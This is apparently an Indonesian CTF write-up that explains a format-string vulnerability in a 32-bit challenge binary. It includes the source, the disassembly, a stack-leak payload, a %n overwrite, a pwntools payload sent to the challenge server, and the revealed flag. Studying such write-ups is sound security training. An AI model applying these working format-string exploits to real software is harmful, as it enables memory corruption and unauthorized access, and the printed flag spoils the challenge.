Pastikan kalian sudah absensi yaah :D

```bash
nc 103.157.96.13 7779
```

Download : https://mega.nz/#!hxAWGRaL!3jqKWlqhWy5cNySv3Y_1p4LloINBZuXKSkBl_0FP4ZE

```
chal15: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=3c5e9d54084d4d470b802d93ace1ba7c3f782c65, not stripped
```

#### Source

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>

int target;

void flag() {
	char flag[64];
	FILE * f = fopen("flag", "r");
	if (f == NULL) {
		printf("File flag nya tidak ada! Kontak developer CTFR kami\n");
		exit(0);
	}
	fgets(flag, 64, f);
	printf("Here is your flag %s\n", flag);
}

void get() {
	char buff[256];
	fgets(buff, sizeof(buff), stdin);
	printf("Terima kasih sudah absensi ");
	printf(buff);
	printf("\n");
	if(target) {
		printf("Bagaimana anda bisa masuk kesini 1!1!1!...\n");
		flag();
	} else {
		// Do nothing
	}
}
int main() {
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);

	printf("-= Absensi CTFR =-\n");
	printf("Ketik nama anda untuk absensi: ");
	get();
}
```

kalo dilihat dari sourcenya ini format string vulnerablity, posisinya ada pada bagian `printf(buff);` yang ada di fungsi `get()`, dan disini diharuskan merubah variabe `target` agar bernilai true, jika dilihat dari bentuk disassamblenya

```bash
0x080486a9 <+99>:    add    esp,0x10
0x080486ac <+102>:   mov    eax,0x804a038
0x080486b2 <+108>:   mov    eax,DWORD PTR [eax]
0x080486b4 <+110>:   test   eax,eax
0x080486b6 <+112>:   je     0x80486cf <get+137>
```

nilai target dimasukan kedalam `eax` yang diambil dari alamat `0x804a038`, harus mencoba melakukan leak address `0x804a038` untuk bisa memodifikasinya

```bash
python2 -c "print 'AAAA'+ '\x38\xa0\x04\x08' + 'BBBB'+ '%x ' * 15 " | ./chal15
-= Absensi CTFR =-
Ketik nama anda untuk absensi: Terima kasih sudah absensi AAAA8BBBB100 f7fac580 8048655 41414141 804a038 42424242 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 
```

dengan pattern yang diberikan, inputan muncul pada posisi ke 4, ditandai dengan `AAAA` menjadi `41414141` dan dilanjutkan dengan alamat target `804a038` dilanjutkan dengan inputan `BBBB` menjadi `42424242` ini artinya alamat `target` berada di urutan `ke-4` didalam stack memory dengan alamat `0x0804a038` jadi bisa menulis ulang nilai target agar bernilai `true`

```bash
python2 -c "print 'AAAA'+ '\x38\xa0\x04\x08' + 'BBBB'+ '%x ' * 4 +'%n 0x1'" | ./chal15                                                                     
-= Absensi CTFR =-
Ketik nama anda untuk absensi: Terima kasih sudah absensi AAAA8BBBB100 f7fac580 8048655 41414141  0x1

Bagaimana anda bisa masuk kesini 1!1!1!...
File flag nya tidak ada! Kontak developer CTFR kami
``` 

atau jika menggunakan Pwntools 

```bash
python2 -c "from pwn import*; print(fmtstr_payload(4, {0x0804a038: 0x1}, 10))" | ./chal15
```

hasilnya akan sama saja, jika dicoba di remote appnya

```bash
python2 -c "from pwn import*; print(fmtstr_payload(4, {0x0804a038: 0x1}, 10))" | nc 103.157.96.13 7779
-= Absensi CTFR =-
Ketik nama anda untuk absensi: Terima kasih sudah absensi                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     �aa89�

Bagaimana anda bisa masuk kesini 1!1!1!...
Here is your flag CTFR{4n0th3r_51mpl3_f0rm4t_3xpl01t}
```

Flag 

```
CTFR{4n0th3r_51mpl3_f0rm4t_3xpl01t}
```